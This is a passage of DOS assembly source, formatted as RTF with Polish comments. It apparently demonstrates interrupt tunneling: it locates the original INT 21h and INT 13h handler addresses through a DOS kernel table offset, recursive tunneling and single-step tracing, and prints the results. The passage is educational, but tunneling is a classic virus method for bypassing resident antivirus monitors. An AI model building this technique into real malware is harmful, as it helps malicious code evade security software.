\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pushf                        ; \\    wylacz tryb krokowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ;  \\   procesora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            and  ah,0FEH                 ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            popf                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lds  dx,dword ptr cs:of1     ; \\  przywroc stary adres przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,2501h                ;  / krokowego Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  dx                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  cx                      ;   \\ przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  es                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ds                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracing13 endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracer_13  proc far}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bp                      ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bp,sp                   ; BP wskazuje na stos}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; [bp+00]  BP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; [bp+02]  IP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; [bp+04]  CS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; [bp+06]  FLAGS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  cs:TraceMode,ON         ; czy wlaczony tracer ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  Tracer_13Exit           ; jesli nie, to wyskocz z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,[bp+04]              ; AX=CS image}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  ax,cs:ShowSeg           ; czy segment kodu ten sam}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            je   OldSeg13                ; tak=wyskocz procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; nie=zachowaj nowy adres seg:ofs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  cs:ShowSeg,ax           ; AX=CS image}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,[bp+02]              ; AX=IP image}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  cs:ShowOfs,ax}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OldSeg13:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp cx,cs:MagicNum1          ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne Tracer_13Exit            ;  \\ czy funkcja sie juz wykonala ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp dx,cs:MagicNum2          ;  / nie=wyskocz z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne Tracer_13Exit            ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov cs:TraceMode,OFF         ; tak=wylacz tracer, bo adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; znaleziony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracer_13Exit:                          ; koniec przerwania Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop ax                       ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            or   byte ptr [bp+7],1       ; [bp+06]  FLAGS , ustaw}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; bit TF dla nastepnego rozkazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; wykonywanego po IRET}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bp                      ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            iret                         ; powrot z przerwania Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracer_13  endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GetOriginal21  proc near}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeGet21              ; \\ pokaz info o przerwaniu 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call LookUpTable21           ; wez adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; tablica stalych adresow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call ShowAddr                ; pokaz adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Recursive21             ; wez adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; metoda tunelingu rekursywnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call ShowAddr                ; pokaz adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Tracing21               ; wez adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; metoda tracingu (tryb krokowy)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call ShowAddr                ; pokaz adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ; przywroc zmieniany rejeetr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GetOriginal21  endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LookUpTable21 proc near}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push es                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;  \\  zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeLookUpTable21      ; \\ wyswietl info o metodzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xor  ax,ax                   ; \\ zeruj zmienne pomocnicze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowSeg,ax              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowOfs,ax              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowError, offset TeLookUpTableFailDOSVer}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; ewentualny komunikat o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,30h                  ; \\ wez wersje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xchg al,ah                   ; ax=wersja DOS, ah=major,al=minor}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bx,109Eh                ; ofset dla DOS 5.0 - 6.22}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  ax,0500h                ; wersja musi byc wieksza od 5.00}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jb   LookUpTable21_Exit      ; mniejsza=tuneling nie zadziala}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  ax,0622h                ; dla wersji wiekszej od 6.22}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jbe  DOSVerOk21              ; jest inny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bx,0FB2h                ; ofset dla DOS >6.22 (np. 7.0)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DOSVerOk21:                             ; ofset ustawiony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ; zachowaj go na stosie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,52h                  ; \\ pobierz do ES:BX adres struktury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; / LL (lista list)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ; przywroc ze stosu ofset do skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowError, offset TeLookUpTableFailBadOfs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; ewentualny komunikat o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; czy pod ES;BX jest sekwencja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; 90 lub EB      NOP \\JMP $+3}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; 90 lub 03      NOP /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; E8 xx xx       CALL NEAR [IP+xxxx]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; 2E FF 2E yyyy  JMP FAR CS:[yyyy] ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  word ptr es:[bx],9090h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            je   FirstCodeOK21           ; skocz, gdy sa 2 NOPy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  word ptr es:[bx],03EBh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  LookUpTable21_Exit      ; skocz, gdy JMP $+3}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch FirstCodeOK21:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  byte ptr es:[bx+2],0E8h ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  LookUpTable21_Exit      ; skocz, gdy nie ma CALL xxxx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  word ptr es:[bx+5],0FF2Eh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  LookUpTable21_Exit      ; skocz, gdy nie ma czesci rozkazu jmp far}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  byte ptr es:[bx+7],02Eh ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  LookUpTable21_Exit      ; skocz, gdy nie ma czesci rozkazu jmp far}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bx,word ptr es:[bx+8]   ; \\ pobierz [yyyy]=adres oryginalnej procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            les  bx,dword ptr es:[bx]    ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
